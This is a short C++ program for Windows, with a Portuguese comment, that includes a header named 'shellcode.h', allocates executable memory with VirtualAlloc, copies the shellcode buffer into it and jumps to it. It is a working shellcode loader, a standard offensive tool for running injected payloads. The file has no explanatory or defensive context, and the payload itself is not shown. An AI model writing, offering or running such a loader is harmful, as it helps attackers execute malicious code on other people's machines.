#include <windows.h>
#include <iostream>
#include "shellcode.h"  // deve estar no mesmo diretório

int main() {
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
    return 0;
}
